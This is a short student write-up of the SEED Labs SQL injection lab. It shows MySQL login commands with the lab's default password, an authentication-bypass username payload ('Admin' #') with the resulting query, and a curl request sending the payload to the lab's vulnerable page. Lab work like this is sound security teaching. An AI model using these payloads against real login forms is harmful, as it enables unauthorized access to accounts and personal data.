# SQL-INJECTION
<table>
  <thead>
    <tr>
      <th>Title</th>
      <th>Author</th>
      <th>Date</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Seed Lab Ubunto 16.04 SQL Injection Attack</td>
      <td>Xinyi Li</td>
      <td>29-10-2021</td>
    </tr>
  </tbody>
</table>
<h1>Task 1</h1>
<h3>Login MYSQL:</h3>
<p>mysql -u root -pseedubuntu<br>
   mysql> use Users;<br>
   mysql> show tables;<br>
</p>
<h3>Use Such a SQL Query:</h3>
<p>select * from credential where Name = 'Alice';</p>
<p>Screen shoot is in SQL Injection Folder</p>
<h1>Task 2</h1>
<h2>Task 2.1</h2>
<ul>
<li>USERNAME: "Admin' #"</li>
<li>PASSWORD: "***" whatever the password was</li> 
</ul>
<h3>It will result in a SQL Query as:</h3>
<p>SELECT id, name, eid, salary, birth, ssn, address, email,<br>
   nickname, Password<br> 
   FROM credential<br>
   WHERE name= 'Admin' #' and Password='***'
   </p>
<p>Then statement after <code>#</code> will bi regarded as comments. So we can login in as <code> Admin</code>.</p>
<p>Screen shoot is in SQL Injection Folder</p>
<h2>Task 2.2</h2>
<pre>
<code>
curl 'http://www.seedlabsqlinjection.com/unsafe_home.php?username=Admin%27%20%23Password=xyz'
</code>
</pre>
<p>It will return a bunch of <code>html</code>code. When exporting outputs to file by<code> > temp.html</code>and open it</p>
<p>Screen shoot is in SQL Injection Folder</p>


